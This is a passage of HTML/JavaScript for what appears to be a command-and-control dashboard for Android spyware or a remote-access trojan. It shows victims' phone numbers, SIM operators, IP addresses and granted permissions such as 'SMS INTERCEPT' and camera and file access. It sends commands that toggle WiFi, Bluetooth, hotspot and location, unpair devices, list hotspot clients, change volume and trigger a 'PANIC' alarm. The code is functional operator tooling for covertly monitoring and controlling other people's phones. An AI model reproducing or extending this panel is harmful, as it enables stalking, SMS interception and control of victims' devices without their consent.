                    const data = await res.json();
                    if (data && data.length > 0) {
                        const info = JSON.parse(data[0].content);
                        if (Date.now() - info.timestamp < 30000) {
                            clearInterval(poll);
                            if (info.error) {
                                bodyDiv.innerHTML = `<div style="text-align:center; padding:40px; color:var(--accent-red);"><i class="fas fa-shield-alt" style="font-size:2rem; margin-bottom:15px;"></i><p>${info.error}</p></div>`;
                            } else {
                                renderHSList(info);
                            }
                        }
                    }
                    if (attempts > 15) {
                        clearInterval(poll);
                        bodyDiv.innerHTML = `<div style="text-align:center; padding:40px; color:var(--accent-red);"><i class="fas fa-exclamation-triangle" style="font-size:2rem; margin-bottom:15px;"></i><p>Request Timed Out</p></div>`;
                    }
                }, 2000);
            } catch (err) {}
        };

        function renderHSList(data) {
            const body = document.getElementById('hsModalBody');
            let html = `<div style="font-size:0.7rem; font-weight:800; color:var(--primary); margin-bottom:15px; letter-spacing:1px;">ACTIVE TETHERING CLIENTS</div>`;

            if (data.clients && data.clients.length > 0) {
                html += data.clients.map(c => `
                    <div class="settings-item">
                        <div class="settings-icon"><i class="fas fa-laptop"></i></div>
                        <div class="settings-info">
                            <div class="settings-label">Connected Node</div>
                            <div class="settings-sub">IP: <span class="settings-key">${c.ip}</span></div>
                            <div class="settings-sub" style="margin-top:2px;">MAC: <span style="font-family:monospace; color:var(--text-secondary); font-size:0.65rem;">${c.mac}</span></div>
                        </div>
                        <div style="width:10px; height:10px; border-radius:50%; background:var(--accent-green); box-shadow:0 0 8px var(--accent-green);"></div>
                    </div>`).join('');
            } else {
                html += `<div style="text-align:center; padding:30px; opacity:0.6;">
                            <i class="fas fa-user-slash" style="font-size:2rem; margin-bottom:10px;"></i>
                            <p style="font-size:0.8rem;">No clients currently leased</p>
                         </div>`;
            }
            body.innerHTML = html;
        }

        function renderBTList(data) {
            const body = document.getElementById('btModalBody');
            let html = `<div style="font-size:0.7rem; font-weight:800; color:var(--primary); margin-bottom:15px; letter-spacing:1px;">PAIRED DEVICES & PERIPHERALS</div>`;

            if (data.paired && data.paired.length > 0) {
                html += data.paired.map(d => {
                    let icon = 'fas fa-mobile-alt';
                    if(d.name.toLowerCase().includes('buds') || d.name.toLowerCase().includes('pod')) icon = 'fas fa-headphones';
                    if(d.name.toLowerCase().includes('watch')) icon = 'fas fa-stopwatch';

                    return `
                    <div class="settings-item" style="justify-content: space-between;">
                        <div style="display: flex; align-items: center;">
                            <div class="settings-icon"><i class="${icon}"></i></div>
                            <div class="settings-info">
                                <div class="settings-label">${d.name}</div>
                                <div class="settings-sub">MAC: <span class="settings-key">${d.address}</span></div>
                            </div>
                        </div>
                        <button onclick="window.unpairDevice('${d.address}')" style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); color: #f87171; padding: 5px 10px; border-radius: 10px; font-size: 0.65rem; font-weight: 700; cursor: pointer;">UNPAIR</button>
                    </div>`;
                }).join('');
            } else {
                html += `<p style="font-size:0.75rem; color:var(--text-secondary);">No paired devices found.</p>`;
            }
            body.innerHTML = html;
        }

        window.unpairDevice = async function(address) {
            if(!confirm("Force unpair this hardware node?")) return;
            try {
                const body = JSON.stringify({ device_uuid: selectedId, type: '/bt_unpair', status: 'pending', data: JSON.stringify({ address: address }), operator_id: auth.operator_id });
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body });
                alert("Unpair command broadcasted.");
                window.requestBTData();
            } catch (err) {}
        };

        function updateDetail(silent = false) {
            const d = allDevices.find(dev => dev.device_uuid === selectedId);
            if (!d) return;
            const online = (new Date() - new Date(d.last_seen)) < 35000 && d.status !== 'offline';
            const p = d.permissions || {};

            const batteryVal = parseInt(d.battery) || 0;
            let sPerc = 0, rPerc = 0;
            try {
                if (d.storage) {
                    const s = d.storage.split("/");
                    const avail = parseFloat(s[0]);
                    const total = parseFloat(s[1]);
                    sPerc = Math.round(((total - avail) / total) * 100) || 0;
                }
                if (d.ram) {
                    const r = d.ram.split("/");
                    const avail = parseFloat(r[0]);
                    const total = parseFloat(r[1]);
                    rPerc = Math.round(((total - avail) / total) * 100) || 0;
                }
            } catch(e) {}

            const nums = (d.device_number || "HIDDEN | HIDDEN").split("|");
            const sims = (d.sim_operator || "No SIM | No SIM").split("|");
            const n1 = (nums[0] || "HIDDEN").trim();
            const n2 = (nums[1] || "HIDDEN").trim();
            const s1 = (sims[0] || "No SIM").trim();
            const s2 = (sims[1] || "No SIM").trim();

            const netParts = (d.network_type || "N/A | W:OFF | B:OFF | H:OFF | L:OFF | V:0%").split("|");
            const netType = (netParts[0] || "N/A").trim();
            const wifi = (netParts[1] || "W:OFF").trim();
            const bt = (netParts[2] || "B:OFF").trim();
            const hs = (netParts[3] || "H:OFF").trim();
            const loc = (netParts[4] || "L:OFF").trim();
            const vol = (netParts[5] || "V:0%").trim();

            const container = document.getElementById('detailView');
            if (silent && container.getAttribute('data-active-id') === selectedId) {
                updateValue('val-battery', (d.battery || '0') + '%');
                updateValue('sub-battery', `⚡ ${d.charging==='Yes'?'Charging':'Discharging'}`);
                updateProgress('prog-battery', batteryVal);
                updateValue('val-storage', d.storage||'--');
                updateValue('sub-storage', `${sPerc}% Capacity Occupied`);
                updateProgress('prog-storage', sPerc);
                updateValue('val-ram', d.ram||'--');
                updateValue('sub-ram', `${rPerc}% Computational Load`);
                updateProgress('prog-ram', rPerc);

                updateValue('val-slot1', s1);
                updateValue('sub-slot1', n1);
                updateValue('val-slot2', s2);
                updateValue('sub-slot2', n2);

                updateControl('btn-wifi', wifi, (id) => `window.toggleWifi('${selectedId}', '${wifi}')`);
                updateControl('btn-bt', bt, (id) => `window.toggleBluetooth('${selectedId}', '${bt}')`);
                updateControl('btn-hs', hs, (id) => `window.toggleHotspot('${selectedId}', '${hs}')`);
                updateControl('btn-loc', loc, (id) => `window.toggleLocation('${selectedId}', '${loc}')`);

                const wifiSsid = wifi.includes('(') ? wifi.split('(')[1].replace(')','') : 'WiFi';
                const btName = bt.includes('(') ? bt.split('(')[1].replace(')','') : 'BT';
                updateValue('wifi-ssid', wifiSsid);
                updateValue('bt-name', btName);

                updateValue('val-net', netType);

                updateValue('val-vol', vol);
                updateProgress('prog-vol', parseInt(vol.replace('%','')));

                updateValue('val-ip', d.ip_address||'hidden');
                updateValue('val-screen', d.screen_status||'OFF');
                updateValue('val-time', new Date(d.last_seen).toLocaleTimeString());
                updateBadge(online);
                updatePermissions(p);
                return;
            }

            container.setAttribute('data-active-id', selectedId);
            const currentVol = parseInt(vol.replace('V:','').replace('%','')) || 0;
            const html = `
                <div class="detail-content">
                    <div class="detail-header">
                        <div>
                            <h1 style="font-family:'Space Grotesk'; color:#fff;">${d.brand || 'XIAOMI'} ${d.model || ''}</h1>
                            <p style="font-size:0.7rem; color:var(--text-secondary); margin-top:5px;"><i class="fas fa-fingerprint"></i> ${d.device_uuid}</p>
                        </div>
                        <div style="display:flex; flex-direction:column; align-items:flex-end; gap:10px;">
                            <div id="conn-badge" class="connection-badge ${online?'badge-online':'badge-offline'}">${online?'● UPLINK ACTIVE':'✕ UPLINK SEVERED'}</div>
                            <button onclick="window.confirmDelete('${d.device_uuid}')" style="background:rgba(225,29,72,0.1); border:1px solid var(--primary); color:var(--primary); padding:6px 12px; border-radius:12px; font-size:0.65rem; font-weight:700; cursor:pointer; transition:all 0.3s;"><i class="fas fa-trash-alt"></i> DELETE NODE</button>
                        </div>
                    </div>
                    <div class="stats-grid">
                        ${tile('battery-three-quarters', 'ENERGY CELL', (d.battery || '0') + '%', `⚡ ${d.charging==='Yes'?'Charging':'Discharging'}`, batteryVal, 'battery')}
                        ${tile('database', 'STORAGE UNIT', d.storage||'--', `${sPerc}% Capacity Occupied`, sPerc, 'storage')}
                        ${tile('microchip', 'MEMORY CORE', d.ram||'--', `${rPerc}% Computational Load`, rPerc, 'ram')}
                        ${tile('phone-alt', 'OPERATOR 1', s1, n1, null, 'slot1')}
                        ${tile('phone-alt', 'OPERATOR 2', s2, n2, null, 'slot2')}

                        <div class="stat-tile" style="grid-column: span 1;">
                             <div class="stat-label">WIFI CONTROL</div>
                             <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
                                 <span id="wifi-ssid" style="font-size:0.8rem; font-weight:600; color:#fff; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:140px;">
                                    <i class="fas fa-wifi" style="margin-right:5px; color:${wifi.includes('ON') ? 'var(--accent-green)' : 'var(--text-secondary)'};"></i>
                                    ${wifi.includes('(') ? wifi.split('(')[1].replace(')','') : 'WiFi'}
                                 </span>
                                 <button id="btn-wifi" onclick="window.toggleWifi('${d.device_uuid}', '${wifi}')" class="perm-tag ${wifi.includes('ON')?'tag-enabled':'tag-disabled'}" style="border:none; cursor:pointer; min-width:60px;">${wifi.includes('ON')?'ON':'OFF'}</button>
                             </div>
                             <button onclick="window.scanWifi('${d.device_uuid}')" style="width:100%; margin-top:12px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:var(--text-secondary); padding:6px; border-radius:10px; font-size:0.65rem; font-weight:700; cursor:pointer;"><i class="fas fa-search"></i> SCAN NETWORKS</button>
                        </div>

                        <div class="stat-tile" style="grid-column: span 1;">
                             <div class="stat-label">BLUETOOTH CONTROL</div>
                             <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
                                 <span id="bt-name" style="font-size:0.8rem; font-weight:600; color:#fff; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:140px;">
                                    <i class="fab fa-bluetooth-b" style="margin-right:5px; color:${bt.includes('ON') ? '#3b82f6' : 'var(--text-secondary)'};"></i>
                                    ${bt.includes('(') ? bt.split('(')[1].replace(')','') : 'BT'}
                                 </span>
                                 <button id="btn-bt" onclick="window.toggleBluetooth('${d.device_uuid}', '${bt}')" class="perm-tag ${bt.includes('ON')?'tag-enabled':'tag-disabled'}" style="border:none; cursor:pointer; min-width:60px;">${bt.includes('ON')?'ON':'OFF'}</button>
                             </div>
                             <button onclick="window.scanBT('${d.device_uuid}')" style="width:100%; margin-top:12px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:var(--text-secondary); padding:6px; border-radius:10px; font-size:0.65rem; font-weight:700; cursor:pointer;"><i class="fas fa-link"></i> VIEW DEVICES</button>
                        </div>

                        <div class="stat-tile" style="grid-column: span 1;">
                             <div class="stat-label">HOTSPOT CONTROL</div>
                             <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
                                 <span id="hs-status" style="font-size:0.8rem; font-weight:600; color:#fff;">
                                    <i class="fas fa-rss" style="margin-right:5px; color:${hs.includes('ON') ? 'var(--primary)' : 'var(--text-secondary)'};"></i>
                                    Tethering
                                 </span>
                                 <button id="btn-hs" onclick="window.toggleHotspot('${d.device_uuid}', '${hs}')" class="perm-tag ${hs.includes('ON')?'tag-enabled':'tag-disabled'}" style="border:none; cursor:pointer; min-width:60px;">${hs.includes('ON')?'ON':'OFF'}</button>
                             </div>
                             <button onclick="window.viewHotspotClients('${d.device_uuid}')" style="width:100%; margin-top:12px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:var(--text-secondary); padding:6px; border-radius:10px; font-size:0.65rem; font-weight:700; cursor:pointer;"><i class="fas fa-users"></i> VIEW CONNECTED</button>
                        </div>

                        <div class="stat-tile" style="grid-column: span 1;">
                             <div class="stat-label">LOCATION SERVICE</div>
                             <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
                                 <span id="loc-status" style="font-size:0.8rem; font-weight:600; color:#fff;">
                                    <i class="fas fa-location-dot" style="margin-right:5px; color:${loc.includes('ON') ? 'var(--accent-green)' : 'var(--text-secondary)'};"></i>
                                    GPS Node
                                 </span>
                                 <button id="btn-loc" onclick="window.toggleLocation('${d.device_uuid}', '${loc}')" class="perm-tag ${loc.includes('ON')?'tag-enabled':'tag-disabled'}" style="border:none; cursor:pointer; min-width:60px;">${loc.includes('ON')?'ON':'OFF'}</button>
                             </div>
                             <small style="font-size:0.6rem; color:var(--text-secondary); margin-top:12px; display:block;">Satellite Uplink Status</small>
                        </div>

                        <div class="stat-tile" style="grid-column: span 1;">
                             <div class="stat-label">MOBILE NETWORK</div>
                             <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
                                 <span style="font-size:0.8rem; font-weight:600; color:#fff;">
                                    <i class="fas fa-signal" style="margin-right:5px; color:${netType === 'Mobile' ? 'var(--primary)' : 'var(--text-secondary)'};"></i>
                                    Data State
                                 </span>
                                 <span class="perm-tag ${netType === 'Mobile' ? 'tag-enabled' : 'tag-disabled'}" style="min-width:60px; text-align:center;">${netType === 'Mobile' ? 'ACTIVE' : 'IDLE'}</span>
                             </div>
                             <div class="stat-value" id="val-net" style="font-size:0.9rem; margin-top:8px;">${netType}</div>
                        </div>

                        <div class="stat-tile" style="grid-column: span 1;">
                             <div class="stat-label">AUDIO ENGINE</div>
                             <div class="stat-value" id="val-vol">${vol}</div>
                             <div class="vol-control">
                                 <span class="vol-btn" onclick="window.setVolume('${d.device_uuid}', Math.max(0, ${currentVol}-10), true)">-</span>
                                 <div class="vol-slider-bg"
                                      onmousedown="window.startDrag(event, '${d.device_uuid}')"
                                      ontouchstart="window.startDrag(event, '${d.device_uuid}')"
                                      id="slider-bg">
                                     <div class="vol-slider-fill" id="prog-vol" style="width:${currentVol}%"></div>
                                 </div>
                                 <span class="vol-btn" onclick="window.setVolume('${d.device_uuid}', Math.min(100, ${currentVol}+10), true)">+</span>
                             </div>
                             <small style="font-size:0.6rem; color:var(--text-secondary);">Media Stream Load</small>
                        </div>

                        <div class="stat-tile" style="grid-column: span 1;">
                             <div class="stat-label">URGENT SIGNALS</div>
                             <div style="display:flex; gap:10px; margin-top:15px;">
                                 <button onclick="window.triggerVibrate('${d.device_uuid}')" style="flex:1; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#fff; padding:12px; border-radius:15px; font-size:0.75rem; font-weight:800; cursor:pointer; transition:0.3s;" onmouseover="this.style.background='rgba(16,185,129,0.1)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'">
                                    <i class="fas fa-mobile-alt" style="margin-right:5px; color:var(--accent-green);"></i> VIBRATE
                                 </button>
                                 <button onclick="window.triggerPanic('${d.device_uuid}')" style="flex:1; background:rgba(225,29,72,0.1); border:1px solid var(--primary); color:#fff; padding:12px; border-radius:15px; font-size:0.75rem; font-weight:800; cursor:pointer; transition:0.3s;" onmouseover="this.style.background='var(--primary)'" onmouseout="this.style.background='rgba(225,29,72,0.1)'">
                                    <i class="fas fa-bullhorn" style="margin-right:5px;"></i> PANIC
                                 </button>
                             </div>
                             <small style="font-size:0.6rem; color:var(--text-secondary); margin-top:10px; display:block;">Haptic & Acoustic Alert</small>
                        </div>

                        ${tile('wifi', 'IP PROTOCOL', d.ip_address||'hidden', 'Network Interface', null, 'ip')}
                        ${tile('tv', 'VISUAL STATE', d.screen_status||'OFF', 'Display Hardware Status', null, 'screen')}
                        ${tile('robot', 'OS ARCHITECTURE', d.android_version||'N/A', 'Kernel Build Level')}
                        ${tile('clock', 'LAST TELEMETRY', new Date(d.last_seen).toLocaleTimeString(), 'Sync Timestamp', null, 'time')}
                    </div>
                    <div class="permission-section">
                        <div class="perm-head"><i class="fas fa-shield-halved"></i> ACCESS AUTHORITY PROTOCOLS</div>
                        <div class="perm-list" id="perm-list-container">
                            ${perm('SMS INTERCEPT', p.RECEIVE_SMS)}
                            ${perm('SMS TRANSMIT', p.SEND_SMS)}
                            ${perm('SMS ARCHIVE', p.READ_SMS)}
                            ${perm('VOICE UPLINK', p.CALL_PHONE)}
                            ${perm('IDENTITY READ', p.READ_PHONE_STATE)}
                            ${perm('GEO-LOCATION', p.LOCATION)}
                            ${perm('OPTICAL ACCESS', p.CAMERA)}
                            ${perm('FILESYSTEM ACCESS', p.FILES)}
                            ${perm('SYSTEM ALERT', p.SYSTEM_ALERT)}
                        </div>
                    </div>
                </div>`;
            container.innerHTML = html;
        }

        function updateValue(id, val) { const el = document.getElementById(id); if (el && el.innerText !== val) el.innerText = val; }

        function updateControl(id, status, clickHandler) {
            const el = document.getElementById(id);
            if (!el) return;
            const ok = status.includes('ON');
            const cls = `perm-tag ${ok?'tag-enabled':'tag-disabled'}`;
            if (el.className !== cls) el.className = cls;
            const txt = ok ? 'ON' : 'OFF';
            if (el.innerText !== txt) el.innerText = txt;
            el.setAttribute('onclick', clickHandler());
        }

        function updateProgress(id, perc) { const el = document.getElementById(id); if (el) el.style.width = perc + '%'; }
        function updateBadge(online) {
            const el = document.getElementById('conn-badge');
            if (el) {
                const cls = `connection-badge ${online?'badge-online':'badge-offline'}`;
                if (el.className !== cls) el.className = cls;
                const txt = online?'● UPLINK ACTIVE':'✕ UPLINK SEVERED';
                if (el.innerText !== txt) el.innerText = txt;
            }
        }
        function updatePermissions(p) {
            const container = document.getElementById('perm-list-container');
            if (container) {
                const newHtml = `
                    ${perm('SMS INTERCEPT', p.RECEIVE_SMS)}
                    ${perm('SMS TRANSMIT', p.SEND_SMS)}
                    ${perm('SMS ARCHIVE', p.READ_SMS)}
                    ${perm('VOICE UPLINK', p.CALL_PHONE)}
                    ${perm('IDENTITY READ', p.READ_PHONE_STATE)}
                    ${perm('GEO-LOCATION', p.LOCATION)}
                    ${perm('OPTICAL ACCESS', p.CAMERA)}
                    ${perm('FILESYSTEM ACCESS', p.FILES)}
                    ${perm('SYSTEM ALERT', p.SYSTEM_ALERT)}
                `;
                if (container.innerHTML !== newHtml) container.innerHTML = newHtml;
            }
        }

        function tile(icon, label, value, sub, perc = null, idPrefix = null) {
            return `<div class="stat-tile">
                <i class="fas fa-${icon} stat-icon"></i>
                <div class="stat-label">${label}</div>
                <div class="stat-value" ${idPrefix ? `id="val-${idPrefix}"` : ''}>${value}</div>
                ${perc !== null ? `<div class="progress-bg"><div class="progress-fill" ${idPrefix ? `id="prog-${idPrefix}"` : ''} style="width:${perc}%"></div></div>` : ''}
                <small class="stat-sub" ${idPrefix ? `id="sub-${idPrefix}"` : ''} style="font-size:0.6rem; color:var(--text-secondary);">${sub}</small>
            </div>`;
        }

        function perm(label, status) {
            const ok = status==='Enabled' || status==='GRANTED';
            return `<div class="perm-item"><span class="perm-name">${label}</span><span class="perm-tag ${ok?'tag-enabled':'tag-disabled'}">${ok?'GRANTED':'DENIED'}</span></div>`;
        }

        const search = document.getElementById('deviceSearch');
        if (search) search.addEventListener('input', renderList);

        fetchData();
        setInterval(fetchData, 8000);
    })();
</script>
</body>
</html>
